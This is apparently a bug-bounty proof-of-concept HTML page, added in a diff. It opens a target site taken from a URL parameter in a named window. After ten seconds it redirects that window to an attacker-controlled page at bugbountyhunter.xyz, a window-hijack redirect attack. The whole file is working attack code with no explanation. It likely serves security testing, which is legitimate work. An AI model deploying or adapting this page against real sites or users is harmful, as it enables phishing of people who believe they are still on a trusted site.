@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: white;
+        }
+    </style>
+    <script>
+        function xxxURLParam(xTargetParam) {
+            const xFormURL = window.location.search.substring(1);
+            const xURLVars = xFormURL.split('&');
+            for (let i = 0; i < xURLVars.length; i++) {
+                const xParam = xURLVars[i].split('=');
+                if (xParam[0] === xTargetParam) {
+                    return xParam[1];
+                }
+            }
+            return "cbbh.png";
+        }
+
+        function init() {
+            console.log("Redirecting to attacker's controlled site");       
+            foo.location.href = "https://bugbountyhunter.xyz/poc.html";
+        }
+
+        function launch() {
+            const target = xxxURLParam("target");
+            foo = window.open(target, "foo", "");
+            console.log("Target site opened successfully");
+            setTimeout(init, 10000);
+        }
+
+        window.onload = launch;
+    </script>
+</head>
+<body onclick="launch()"></body>
+</html>
